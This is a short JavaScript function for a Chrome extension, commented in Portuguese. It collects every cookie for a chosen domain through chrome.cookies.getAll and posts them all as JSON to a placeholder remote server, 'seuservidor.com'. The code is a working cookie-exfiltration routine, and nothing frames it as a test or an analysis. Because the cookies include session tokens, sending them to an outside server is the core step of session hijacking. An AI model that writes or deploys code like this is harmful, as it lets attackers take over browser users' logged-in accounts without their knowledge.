function exportDomainCookies(domain) {
    // Obtém todos os cookies do domínio especificado
    chrome.cookies.getAll({ domain: domain }, function(cookies) {
        // Envia os cookies para o servidor
        fetch('https://seuservidor.com/cookies', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(cookies)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao enviar cookies para o servidor');
            }
            console.log('Cookies enviados com sucesso para o servidor');
        })
        .catch(error => {
            console.error('Erro ao enviar cookies:', error.message);
        });
    });
}